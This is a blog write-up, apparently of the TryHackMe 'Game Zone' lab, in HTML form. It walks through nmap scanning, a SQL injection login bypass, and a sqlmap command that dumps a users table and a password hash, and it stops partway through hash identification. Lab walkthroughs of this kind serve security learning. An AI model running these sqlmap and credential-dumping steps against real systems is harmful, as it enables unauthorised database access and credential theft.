@@ -1,0 +1,790 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Game Zone</title> <meta name="description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Game Zone"> <meta property="og:description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/34_gamezone/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Game Zone"> <meta name="twitter:description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Used SQLMap to retrieve hash, gained SSH access"
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Game Zone | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/34_gamezone/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Game Zone</title> <meta name="description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Game Zone"> <meta property="og:description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/34_gamezone/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Game Zone"> <meta name="twitter:description" content="Used SQLMap to retrieve hash, gained SSH access"> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Used SQLMap to retrieve hash, gained SSH access"
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Game Zone</h1> <p class="post-description">Used SQLMap to retrieve hash, gained SSH access</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/logo.jpeg" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Game Zone Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/room/gamezone" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Let’s hop on the highway to the game zone. Hopefully. Here we go.</p> <p>First step, as usual, is running the nmap to identify the services.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41278"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41278')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41278')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41278')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41278')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41278">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.221.104
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 16:17 AEDT
+Nmap scan report for 10.10.221.104
+Host is up (0.27s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Game Zone
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.4
+OS details: Linux 4.4
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   8.47 ms   10.4.0.1
+2   ... 3
+4   264.47 ms 10.10.221.104
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41278" onclick="terminalOverlayClose('bash-bash-41278')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41278')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41278')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41278')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41278" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.221.104
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 16:17 AEDT
+Nmap scan report for 10.10.221.104
+Host is up (0.27s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Game Zone
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.4
+OS details: Linux 4.4
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   8.47 ms   10.4.0.1
+2   ... 3
+4   264.47 ms 10.10.221.104
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
+</pre> </div> </div> <p><br> Check the Landing Page of the website.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> The character on the landing page is from a game series called Hitman.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/agent47.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Agent 47" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the payload indicated in the box description to bypass the login.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/sqli.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="SQL Injection" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Make a note of were the redirect leads.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/redirect.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Redirect" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Turn the burp interceptor on to be able to catch requests.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/intercept.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Intercept" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Try to run a search request and intercept the request in the Burp.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/request.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Search Request" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Save the request to a text file called request.txt.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-463"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-463')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-463')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-463')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-463')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-463">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ cat request.txt
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-463" onclick="terminalOverlayClose('bash-bash-463')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-463')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-463')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-463')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-463" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ cat request.txt
+</pre> </div> </div> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">request.txt</span> </div> <pre class="codebox__body">
+POST /portal.php HTTP/1.1
+Host: 10.10.190.117
+Content-Length: 15
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.190.117
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.190.117/portal.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=583dqa4lotuo9sise19b4edrh7
+Connection: keep-alive
+
+searchitem=test
+</pre> </div> <p><br> Run sqlmap against the request that we just saved.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41419"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41419')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41419')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41419')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41419')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41419">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sqlmap -r request.txt --dbms=mysql --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:27:35 /2025-02-26/
+
+[17:27:35] [INFO] parsing HTTP request from 'request.txt'
+[17:27:35] [INFO] testing connection to the target URL
+
+&lt;snip&gt;
+
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[17:29:30] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.190.117/dump/db/users.csv'
+[17:29:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.190.117'
+
+[*] ending @ 17:29:30 /2025-02-26/
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41419" onclick="terminalOverlayClose('bash-bash-41419')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41419')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41419')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41419')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41419" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ sqlmap -r request.txt --dbms=mysql --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:27:35 /2025-02-26/
+
+[17:27:35] [INFO] parsing HTTP request from 'request.txt'
+[17:27:35] [INFO] testing connection to the target URL
+
+&lt;snip&gt;
+
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[17:29:30] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.190.117/dump/db/users.csv'
+[17:29:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.190.117'
+
+[*] ending @ 17:29:30 /2025-02-26/
+</pre> </div> </div> <p><br> Create a file that contains the hash so we can feed it into a cracker.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4138"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4138')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4138')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4138')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4138')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4138">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ echo 'agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' &gt; hash.txt
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4138" onclick="terminalOverlayClose('bash-bash-4138')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4138')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4138')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4138')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4138" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ echo 'agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' &gt; hash.txt
+</pre> </div> </div> <p><br> Use hash-identifier to try to identify the type of hash.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41467"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41467')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41467')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41467')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41467')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41467">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ hash-identifier                                                             
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+Least Possible Hashs:
+[+] GOST R 34.11-94
+[+] RipeMD-256
+[+] SNEFRU-256
+[+] SHA-256(HMAC)
+[+] Haval-256(HMAC)
+[+] RipeMD-256(HMAC)
+[+] SNEFRU-256(HMAC)
+[+] SHA-256(md5($pass))
+[+] SHA-256(sha1($pass))
+--------------------------------------------------
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41467" onclick="terminalOverlayClose('bash-bash-41467')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41467')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41467')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41467')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41467" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ hash-identifier                                                             
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
